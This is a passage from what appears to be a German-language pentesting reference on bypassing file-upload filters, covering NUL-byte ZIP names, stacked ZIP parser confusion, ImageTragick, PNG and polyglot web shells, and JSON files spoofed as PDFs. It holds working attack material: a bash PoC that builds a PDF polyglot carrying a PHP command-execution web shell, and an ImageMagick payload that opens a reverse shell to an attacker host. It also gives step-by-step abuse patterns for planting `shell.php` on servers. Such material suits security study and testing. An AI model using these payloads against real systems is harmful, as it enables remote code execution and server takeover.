- Bereite eine legitime Container-Datei vor (z. B. ein gültiges PDF), die einen winzigen PHP-Stub in einem Stream einbettet, sodass magic/MIME weiterhin ein PDF ist.
- Benenne sie z. B. `shell.php..pdf`, zippe sie und editiere dann hex‑weise den ZIP-Local-Header und den Central-Directory-Dateinamen, um den ersten `.` nach `.php` durch `0x00` zu ersetzen, wodurch `shell.php\x00.pdf` entsteht.
- Validatoren, die auf ZipArchive vertrauen, "sehen" `shell.php .pdf` und erlauben es; der Extraktor schreibt `shell.php` auf die Festplatte, was zu RCE führt, falls der Upload-Ordner ausführbar ist.

Minimale PoC-Schritte:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Hinweise
- Change BOTH filename occurrences (local and central directory). Some tools add an extra data descriptor entry too – adjust all name fields if present.
- Die Payload-Datei muss weiterhin server‑seitiges magic/MIME sniffing bestehen. Das Einbetten des PHP in einen PDF-Stream erhält den Header.
- Funktioniert, wenn der enum/validation path und der extraction/write path unterschiedliche String‑Behandlung haben.

### Gestapelte/konkatenierte ZIPs (Parser‑Uneinigkeit)

Das Aneinanderhängen von zwei gültigen ZIP-Dateien erzeugt einen Blob, bei dem verschiedene Parser sich auf unterschiedliche EOCD‑Einträge konzentrieren. Viele Tools lokalisieren das letzte End Of Central Directory (EOCD), während einige Libraries (z. B. ZipArchive in bestimmten Workflows) das erste gefundene Archiv parsen können. Wenn die Validierung das erste Archiv enumeriert und die Extraktion ein anderes Tool verwendet, das das letzte EOCD berücksichtigt, kann ein harmloses Archiv die Checks bestehen, während ein bösartiges extrahiert wird.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Missbrauchsmuster
- Erzeuge ein harmloses Archiv (erlaubter Typ, z. B. eine PDF) und ein zweites Archiv, das eine blockierte Erweiterung enthält (z. B. `shell.php`).
- Hänge sie zusammen: `cat benign.zip evil.zip > combined.zip`.
- Wenn der Server mit einem Parser validiert (sieht benign.zip), aber mit einem anderen extrahiert (verarbeitet evil.zip), landet die blockierte Datei im Extraktionspfad.

## ImageTragic

Lade diesen Inhalt mit einer Bild-Erweiterung hoch, um die Schwachstelle auszunutzen **(ImageMagick , 7.0.1-1)** (aus dem [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Einbetten einer PHP Shell in PNG

Das Einbetten einer PHP Shell in den IDAT-Chunk einer PNG-Datei kann bestimmte Bildverarbeitungsoperationen effektiv umgehen. Die Funktionen `imagecopyresized` und `imagecopyresampled` aus PHP-GD sind in diesem Zusammenhang besonders relevant, da sie üblicherweise zum Größenändern bzw. zur Neuabtastung von Bildern verwendet werden. Dass die eingebettete PHP Shell von diesen Operationen unberührt bleibt, ist für bestimmte Anwendungsfälle ein erheblicher Vorteil.

Eine detaillierte Untersuchung dieser Technik, einschließlich Methodik und möglicher Anwendungen, findet sich im folgenden Artikel: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Diese Ressource liefert ein umfassendes Verständnis des Prozesses und seiner Implikationen.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot-Dateien

Polyglot-Dateien dienen in der Cybersicherheit als besondere Werkzeuge; sie funktionieren wie Chamäleons, die gleichzeitig in mehreren Dateiformaten gültig sein können. Ein interessantes Beispiel ist ein [GIFAR](https://en.wikipedia.org/wiki/Gifar), ein Hybrid, der sowohl als GIF als auch als RAR-Archiv funktioniert. Solche Dateien beschränken sich nicht auf dieses Paar; auch Kombinationen wie GIF und JS oder PPT und JS sind möglich.

Der Hauptnutzen von Polyglot-Dateien liegt in ihrer Fähigkeit, Sicherheitsmaßnahmen zu umgehen, die Dateien nach Typ filtern. Üblich ist es in vielen Anwendungen, nur bestimmte Dateitypen zum Upload zu erlauben — z. B. JPEG, GIF oder DOC — um das Risiko potenziell gefährlicher Formate (z. B. JS, PHP oder Phar) zu mindern. Ein Polyglot kann jedoch, indem es den strukturellen Kriterien mehrerer Dateitypen entspricht, diese Beschränkungen unbemerkt umgehen.

Trotz ihrer Anpassungsfähigkeit stoßen Polyglots auf Einschränkungen. Beispielsweise kann ein Polyglot zwar gleichzeitig eine PHAR-Datei (PHp ARchive) und ein JPEG darstellen, doch der Erfolg des Uploads kann von den Richtlinien der Plattform bezüglich Dateiendungen abhängen. Ist das System strikt bei erlaubten Extensions, reicht die rein strukturelle Dualität eines Polyglots möglicherweise nicht aus, um den Upload zu gewährleisten.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Gültige JSON-Dateien hochladen, als wären es PDFs

Wie man Datei-Typ-Erkennungen umgeht, indem man eine gültige JSON-Datei hochlädt, selbst wenn dies nicht erlaubt ist, indem man sie als PDF fälscht (Techniken aus **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Solange die `%PDF` Magic-Bytes in den ersten 1024 Bytes enthalten sind, ist es gültig (Beispiel im Artikel)
- **`pdflib` library**: Füge ein gefälschtes PDF-Format in ein Feld der JSON ein, sodass die Library denkt, es sei ein pdf (Beispiel im Artikel)
- **`file` binary**: Es kann bis zu 1048576 Bytes aus einer Datei lesen. Erstelle einfach eine JSON, die größer ist, sodass sie den Inhalt nicht als json parsen kann, und füge dann innerhalb der JSON den initialen Teil eines echten PDF ein — es wird denken, es sei ein PDF

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
